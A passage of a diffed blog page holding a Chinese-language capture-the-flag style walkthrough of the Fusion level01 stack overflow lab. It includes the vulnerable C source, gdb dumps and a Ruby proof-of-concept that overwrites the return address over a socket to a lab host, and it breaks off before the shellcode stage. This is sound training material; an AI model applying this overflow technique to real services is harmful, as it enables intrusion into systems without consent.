@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
-    <head>
-	<meta name="generator" content="Hugo 0.94.2" /><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Welcome to Rokkenjima'><title>Senri&#39;s Memos</title>
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Fusion Level 01 Walkthrough...虽然没开 PIE 和 NX 就是了'><title>年轻人的第一次 ASLR</title>
 
-<link rel='canonical' href='/'>
+<link rel='canonical' href='/p/fusion_level_01/'>
 
-<link rel="stylesheet" href="/scss/style.min.66ce53af975830b01002d38d4eb823c7b47d1e58455fb6b3fecbcd684f02b004.css"><meta property='og:title' content='Senri&#39;s Memos'>
-<meta property='og:description' content='Welcome to Rokkenjima'>
-<meta property='og:url' content='/'>
+<link rel="stylesheet" href="/scss/style.min.66ce53af975830b01002d38d4eb823c7b47d1e58455fb6b3fecbcd684f02b004.css"><meta property='og:title' content='年轻人的第一次 ASLR'>
+<meta property='og:description' content='Fusion Level 01 Walkthrough...虽然没开 PIE 和 NX 就是了'>
+<meta property='og:url' content='/p/fusion_level_01/'>
 <meta property='og:site_name' content='Senri&#39;s Memos'>
-<meta property='og:type' content='website'><meta property='og:updated_time' content=' 2022-04-27T14:58:50&#43;00:00 '/>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-04-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-04-27T14:58:50&#43;00:00'/><meta property='og:image' content='/p/fusion_level_01/cover.png' />
 <meta name="twitter:site" content="@kurususenri">
-    <meta name="twitter:creator" content="@kurususenri"><meta name="twitter:title" content="Senri&#39;s Memos">
-<meta name="twitter:description" content="Welcome to Rokkenjima"><link rel="alternate" type="application/rss&#43;xml" href="/index.xml">
+    <meta name="twitter:creator" content="@kurususenri"><meta name="twitter:title" content="年轻人的第一次 ASLR">
+<meta name="twitter:description" content="Fusion Level 01 Walkthrough...虽然没开 PIE 和 NX 就是了"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='/p/fusion_level_01/cover.png' />
     
 
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-KT4W9WZKC8"></script>
@@ -35,7 +35,9 @@ if (!doNotTrack) {
 <meta name="theme-color" content="#ffffff">
 
     </head>
-    <body class="">
+    <body class="
+    article-page
+    ">
     <script>
         (function() {
             const colorSchemeKey = 'StackColorScheme';
@@ -230,23 +232,35 @@ if (!doNotTrack) {
     </ol>
 </aside>
 <main class="main full-width">
-    
-    
-    
-    
-
-    <section class="article-list">
-        
-            
-<article class="">
+    <article class="has-image main-article">
     <header class="article-header">
+        <div class="article-image">
+            <a href="/p/fusion_level_01/">
+                <img src="/p/fusion_level_01/cover_hu3fa5dd3ba2c818abfe88d779311f5bc8_1291915_800x0_resize_box_3.png"
+                        srcset="/p/fusion_level_01/cover_hu3fa5dd3ba2c818abfe88d779311f5bc8_1291915_800x0_resize_box_3.png 800w, /p/fusion_level_01/cover_hu3fa5dd3ba2c818abfe88d779311f5bc8_1291915_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="306" 
+                        loading="lazy"
+                        alt="Featured image of post 年轻人的第一次 ASLR" />
+                
+            </a>
+        </div>
+    
 
     <div class="article-details">
     
     <header class="article-category">
         
-            <a href="/categories/test/" >
-                Test
+            <a href="/categories/fusion/" style="background-color: #351b37; color: #fff;">
+                Fusion
+            </a>
+        
+            <a href="/categories/binary/" style="background-color: #8ea885; color: #fff;">
+                Binary
+            </a>
+        
+            <a href="/categories/stack/" style="background-color: #6b69d6; color: #fff;">
+                Stack
             </a>
         
     </header>
@@ -254,12 +268,12 @@ if (!doNotTrack) {
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/markdown-references/">Lorem ipsum</a>
+            <a href="/p/fusion_level_01/">年轻人的第一次 ASLR</a>
         </h2>
     
         
         <h3 class="article-subtitle">
-            Markdown References
+            Fusion Level 01 Walkthrough...虽然没开 PIE 和 NX 就是了
         </h3>
         
     </div>
@@ -277,7 +291,7 @@ if (!doNotTrack) {
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">Jul 23, 2021</time>
+                <time class="article-time--published">Apr 27, 2022</time>
             </div>
         
 
@@ -288,74 +302,743 @@ if (!doNotTrack) {
     
 </div>
 </header>
-</article>
-        
-            
-<article class="">
-    <header class="article-header">
 
-    <div class="article-details">
+    <section class="article-content">
+    
+    
+    <h2 id="level-01">Level 01</h2>
+<p><a class="link" href="https://exploit.education/fusion/level01/"  target="_blank" rel="noopener"
+    >☞ https://exploit.education/fusion/level01/</a></p>
+<p><strong>About</strong></p>
+<p>level00 with stack/heap/mmap aslr, without info leak :)</p>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Setting</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Vulnerability Type</td>
+<td>Stack</td>
+</tr>
+<tr>
+<td>Position Independent Executable</td>
+<td>No</td>
+</tr>
+<tr>
+<td>Read only relocations</td>
+<td>No</td>
+</tr>
+<tr>
+<td>Non-Executable stack</td>
+<td>No</td>
+</tr>
+<tr>
+<td>Non-Executable heap</td>
+<td>No</td>
+</tr>
+<tr>
+<td>Address Space Layout Randomisation</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Source Fortification</td>
+<td>No</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Source code</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;../common/common.c&#34;    </span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">fix_path</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">resolved</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">realpath</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">resolved</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// can&#39;t access path. will error trying to open
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">strcpy</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">resolved</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="nf">parse_http_request</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// printf(&#34;[debug] buffer is at 0x%08x :-)\n&#34;, buffer); :D
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">))</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">errx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Failed to read from remote host&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&#34;GET &#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Not a GET request&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">path</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="sc">&#39; &#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="n">q</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#34;No protocol version specified&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">q</span><span class="o">++</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="s">&#34;HTTP/1.1&#34;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Invalid protocol&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">fix_path</span><span class="p">(</span><span class="n">path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;trying to access %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">path</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">parse_http_request</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><hr>
+<p>虽然这题确实开了 ASLR&hellip;</p>
+<p>不过看主函数这边，虽然这几个函数（是作者自己写的函数，放在头文件里了）完全没说是做什么的，</p>
+<p>但是从结果来看，它是在有新的 socket 连接的时候 folk 一个子进程来处理那个 socket</p>
+<p>所以主程序其实一直没关过&hellip;所以除非重启一下不然每次 folk 出的子进程的内存空间是一样的</p>
+<p>但是姑且还是用不依赖固定内存地址的方式来做这道题吧</p>
+<hr>
+<h2 id="vulnerability">Vulnerability</h2>
+<p><code>char *parse_http_request()</code> 读入 buffer 的方式是 <code>read(0, buffer, sizeof(buffer))</code>，</p>
+<p>所以这里是没法 buffer overflow 的，真正的问题出在 <code>int fix_path(char *path)</code> 里</p>
+<p>这个函数里出现了 <code>realpath(path, resolved)</code>：</p>
+<blockquote>
+<p><strong>NAME</strong>
+realpath - return the canonicalized absolute pathname</p>
+<p><strong>SYNOPSIS</strong>
+#include &lt;limits.h&gt;
+#include &lt;stdlib.h&gt;</p>
+<pre><code>   char *realpath(const char *path, char *resolved_path);
+</code></pre>
+</blockquote>
+<p>我们不用去关心具体实现，只需要知道它所做的是把 <code>*path</code> 解析后放到 <code>*resolved_path</code> 里&hellip;</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">fix_path</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">resolved</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">realpath</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">resolved</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">strcpy</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">resolved</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>但是 <code>*path</code> 的来源是 <code>path = &amp;buffer[4];</code>，</p>
+<p>buffer 的大小是 <code>char buffer[1024];</code>，</p>
+<p>而 <code>resolved</code> 的大小只有 128 bytes，从这里就可以溢出了</p>
+<hr>
+<p>不过这题还有一个小限制：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&#34;GET &#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Not a GET request&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">path</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="sc">&#39; &#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="n">q</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#34;No protocol version specified&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">q</span><span class="o">++</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="s">&#34;HTTP/1.1&#34;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Invalid protocol&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">fix_path</span><span class="p">(</span><span class="n">path</span><span class="p">);</span>
+</span></span></code></pre></div><p>对于 buffer，其必须以 &ldquo;GET&rdquo; 开头，加上一段路径，再加上 &ldquo;HTTP/1.1&rdquo;，否则不会触发 <code>fix_path(path)</code></p>
+<p>但由于 <code>fix_path(path)</code> 中的 <code>realpath()</code> 会对路径进行解析，可能会破坏 shellcode，所以可以这样写：</p>
+<p><strong>GET #{padding} HTTP/1.1 #{shellcode}</strong></p>
+<h2 id="stack-overflow">Stack Overflow</h2>
+<p>gdb 看一下 <code>fix_path()</code>：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Dump of assembler code <span class="k">for</span> <span class="k">function</span> fix_path:
+</span></span><span class="line"><span class="cl">   0x08049815 &lt;+0&gt;:	push   ebp
+</span></span><span class="line"><span class="cl">   0x08049816 &lt;+1&gt;:	mov    ebp,esp
+</span></span><span class="line"><span class="cl">   0x08049818 &lt;+3&gt;:	sub    esp,0x98
+</span></span><span class="line"><span class="cl">   0x0804981e &lt;+9&gt;:	mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>
+</span></span><span class="line"><span class="cl">   0x08049821 &lt;+12&gt;:	lea    edx,<span class="o">[</span>ebp-0x88<span class="o">]</span>
+</span></span><span class="line"><span class="cl">   0x08049827 &lt;+18&gt;:	mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,edx
+</span></span><span class="line"><span class="cl">   0x0804982b &lt;+22&gt;:	mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+</span></span><span class="line"><span class="cl">   0x0804982e &lt;+25&gt;:	call   0x8048a20 &lt;realpath@plt&gt;
+</span></span><span class="line"><span class="cl">   ......
+</span></span></code></pre></div><p>可以看到 resolved 是从 <em>ebp-0x88</em> 开始的，那么 0x88 = 136 个字符之后到底 ebp，再加 4 个字符就是 return pointer 了</p>
+<p>那么就需要使用 140 个字符来填充：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">hostname</span> <span class="o">=</span> <span class="s2">&#34;192.168.215.135&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">20001</span>
+</span></span><span class="line"><span class="cl"><span class="n">socket</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">request</span> <span class="o">=</span> <span class="s2">&#34;GET &#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">protocol</span> <span class="o">=</span> <span class="s2">&#34; HTTP/1.1&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">=</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="s2">&#34;w&#34;</span> <span class="o">*</span> <span class="mi">139</span>
+</span></span><span class="line"><span class="cl"><span class="n">return_addr</span> <span class="o">=</span> <span class="s2">&#34;ABCD&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">request</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">return_addr</span> <span class="o">+</span> <span class="n">protocol</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;press any key to continue&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">gets</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;&gt; payload: &#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="o">.</span><span class="n">inspect</span>
+</span></span><span class="line"><span class="cl"><span class="n">socket</span><span class="o">.</span><span class="n">puts</span> <span class="n">payload</span>
+</span></span></code></pre></div><p>return_addr 先写上 ABCD 作为标记，看看能不能执行到这里出现 SIGSEGV 吧</p>
+<p>这里的「press any key to continue」的效果是脚本执行到这里会停下来，这时候我们就有足够的时间先去查看主进程 folk 出来的子进程 pid，然后去 gdb：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@fusion:~# pidof level01
+</span></span><span class="line"><span class="cl"><span class="m">10985</span> <span class="m">1415</span>
+</span></span><span class="line"><span class="cl">root@fusion:~# gdb -p <span class="m">10985</span>
+</span></span><span class="line"><span class="cl">......
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> c
+</span></span><span class="line"><span class="cl">Continuing.
+</span></span><span class="line"><span class="cl">Program received signal SIGSEGV, Segmentation fault.
+</span></span><span class="line"><span class="cl">0x44434241 in ?? <span class="o">()</span>
+</span></span></code></pre></div><p>好耶，一次成功，接下来就该考虑把 return pointer 具体写什么地址了</p>
+<hr>
+<h2 id="jmp-to-stack">Jmp to Stack</h2>
+<p>虽然我们无法确定程序每次的地址都在哪里，</p>
+<p>但是我们至少可以确定的在程序执行到 ret 之前的那一刻时，esp 和 ebp 到 buffer 和 resolved 的偏移量</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> disassemble fix_path 
+</span></span><span class="line"><span class="cl">Dump of assembler code <span class="k">for</span> <span class="k">function</span> fix_path:
+</span></span><span class="line"><span class="cl">   0x08049815 &lt;+0&gt;:	push   ebp
+</span></span><span class="line"><span class="cl">   0x08049816 &lt;+1&gt;:	mov    ebp,esp
+</span></span><span class="line"><span class="cl">   0x08049818 &lt;+3&gt;:	sub    esp,0x98
+</span></span><span class="line"><span class="cl">   0x0804981e &lt;+9&gt;:	mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>
+</span></span><span class="line"><span class="cl">   0x08049821 &lt;+12&gt;:	lea    edx,<span class="o">[</span>ebp-0x88<span class="o">]</span>
+</span></span><span class="line"><span class="cl">   0x08049827 &lt;+18&gt;:	mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,edx
+</span></span><span class="line"><span class="cl">   0x0804982b &lt;+22&gt;:	mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+</span></span><span class="line"><span class="cl">   0x0804982e &lt;+25&gt;:	call   0x8048a20 &lt;realpath@plt&gt;
+</span></span><span class="line"><span class="cl">   0x08049833 &lt;+30&gt;:	<span class="nb">test</span>   eax,eax
+</span></span><span class="line"><span class="cl">   0x08049835 &lt;+32&gt;:	jne    0x804983e &lt;fix_path+41&gt;
+</span></span><span class="line"><span class="cl">   0x08049837 &lt;+34&gt;:	mov    eax,0x1
+</span></span><span class="line"><span class="cl">   0x0804983c &lt;+39&gt;:	jmp    0x8049853 &lt;fix_path+62&gt;
+</span></span><span class="line"><span class="cl">   0x0804983e &lt;+41&gt;:	lea    eax,<span class="o">[</span>ebp-0x88<span class="o">]</span>
+</span></span><span class="line"><span class="cl">   0x08049844 &lt;+47&gt;:	mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
+</span></span><span class="line"><span class="cl">   0x08049848 &lt;+51&gt;:	mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>
+</span></span><span class="line"><span class="cl">   0x0804984b &lt;+54&gt;:	mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+</span></span><span class="line"><span class="cl">   0x0804984e &lt;+57&gt;:	call   0x80489a0 &lt;strcpy@plt&gt;
+</span></span><span class="line"><span class="cl"><span class="o">=</span>&gt; 0x08049853 &lt;+62&gt;:	leave  
+</span></span><span class="line"><span class="cl">   0x08049854 &lt;+63&gt;:	ret    
+</span></span><span class="line"><span class="cl">End of assembler dump.
+</span></span></code></pre></div><p>首先需要明确的，leave 和 ret 到底做了什么？</p>
+<p>可以查到的是，对于 Intel 的 x86，<em>leave</em> 的操作是 <em>Set ESP to EBP, then pop EBP.</em></p>
+<p>ret 会稍微复杂一点，因为还分为了 <strong>Near return</strong> 和 <strong>Far return</strong>，但简化来说的话，32 位架构的情况下就相当于：<em>pop eip</em></p>
+<p>这也是为什么断点打在了 <em>leave</em> 的位置，因为想把栈看得更全一点：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> info registers 
+</span></span><span class="line"><span class="cl">eax            0x1	<span class="m">1</span>
+</span></span><span class="line"><span class="cl">ecx            0xb75c48d0	-1218688816
+</span></span><span class="line"><span class="cl">edx            0xbf82b300	-1081953536
+</span></span><span class="line"><span class="cl">ebx            0xb773cff4	-1217146892
+</span></span><span class="line"><span class="cl">esp            0xbf82b260	0xbf82b260
+</span></span><span class="line"><span class="cl">ebp            0xbf82b2f8	0xbf82b2f8
+</span></span><span class="line"><span class="cl">esi            0xbf82b3b5	-1081953355
+</span></span><span class="line"><span class="cl">edi            0x8049ed1	<span class="m">134520529</span>
+</span></span><span class="line"><span class="cl">eip            0x8049853	0x8049853 &lt;fix_path+62&gt;
+</span></span><span class="line"><span class="cl">eflags         0x246	<span class="o">[</span> PF ZF IF <span class="o">]</span>
+</span></span><span class="line"><span class="cl">......
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/60x <span class="nv">$esp</span>
+</span></span><span class="line"><span class="cl">0xbf82b260: 1.<span class="o">[</span>0xbf82b31c<span class="o">]</span>   0xbf82b270    0x080484fc    0x00000200
+</span></span><span class="line"><span class="cl">0xbf82b270: 2.<span class="o">[</span>0x7777772f<span class="o">]</span>   0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b280:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b290:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b2a0:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b2b0:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b2c0:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b2d0:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b2e0:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b2f0:    0x77777777    0x77777777    0x77777777 3.<span class="o">[</span>0x44434241<span class="o">]</span>
+</span></span><span class="line"><span class="cl">0xbf82b300:    0xbf82b300    0x00000020    0x00000004    0x001761e4
+</span></span><span class="line"><span class="cl">0xbf82b310:    0x001761e4    0x000027d8 4.<span class="o">[</span>0x20544547<span class="o">]</span>   0x7777772f
+</span></span><span class="line"><span class="cl">0xbf82b320:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b330:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b340:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span></code></pre></div><ol>
+<li><code>0xbf82b260</code>：在 leave 和 ret 前 esp 指向的地址</li>
+<li><code>0xbf82b270</code>：<code>fix_path()</code> 的 resolved 从这里开始</li>
+<li><code>0xbf82b2fc</code>：覆盖掉的 return pointer</li>
+<li><code>0xbf82b318</code>：<code>parse_http_request()</code> 的 buffer 从这里开始（<em>0x20544547</em> = &ldquo;GET &ldquo;）</li>
+</ol>
+<p>而在执行 leave，也就是 <em>Set ESP to EBP, then pop EBP</em> 后，这一段内存现在看起来是这样的：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> info registers 
+</span></span><span class="line"><span class="cl">eax            0x1	<span class="m">1</span>
+</span></span><span class="line"><span class="cl">ecx            0xb75c48d0	-1218688816
+</span></span><span class="line"><span class="cl">edx            0xbf82b300	-1081953536
+</span></span><span class="line"><span class="cl">ebx            0xb773cff4	-1217146892
+</span></span><span class="line"><span class="cl">esp            0xbf82b2fc	0xbf82b2fc
+</span></span><span class="line"><span class="cl">ebp            0x77777777	0x77777777
+</span></span><span class="line"><span class="cl">esi            0xbf82b3b5	-1081953355
+</span></span><span class="line"><span class="cl">edi            0x8049ed1	<span class="m">134520529</span>
+</span></span><span class="line"><span class="cl">eip            0x8049854	0x8049854 &lt;fix_path+63&gt;
+</span></span><span class="line"><span class="cl">......
+</span></span><span class="line"><span class="cl"><span class="c1"># 注意，这里查看的是与前面相同位置 0xbf82b260 的一大段地址，而不是从 ESP 开始的 60 个地址</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/60x 0xbf82b260
+</span></span><span class="line"><span class="cl">0xbf82b260: 1.<span class="o">[</span>0xbf82b31c<span class="o">]</span>   0xbf82b270    0x080484fc    0x00000200
